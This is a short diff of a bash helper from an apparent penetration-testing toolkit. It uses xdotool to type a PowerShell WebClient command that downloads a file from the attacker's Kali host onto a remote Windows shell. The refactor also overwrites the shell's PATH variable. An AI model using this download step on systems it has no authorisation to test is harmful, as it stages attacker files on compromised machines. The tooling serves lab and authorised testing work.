@@ -4,16 +4,17 @@
 PowerShell: Save file and save in current remote folder.
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
 
-# Generate gui form
-generate_form "Port" "Path"
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+PORT_FIELD=$(form_item  "port" "port")
+PATH_FIELD=$(form_item  "path" "path")
 
-PORT=${form_data["Port"]}
-B_PATH=${form_data["Path"]}
-F_NAME=$(basename $B_PATH)
+# Generate GUI form
+generate_form "${PORT_FIELD}" "${PATH_FIELD}"
 
-paste_command "powershell \"(New-Object System.Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${PORT}/${B_PATH}', '${F_NAME}')\""
+PORT=${form_data["port"]}
+PATH=${form_data["path"]}
+FILE_NAME=$(basename $PATH)
+
+paste_command "powershell \"(New-Object System.Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${PORT}/${PATH}', '${FILE_NAME}')\""
 xdotool key Return
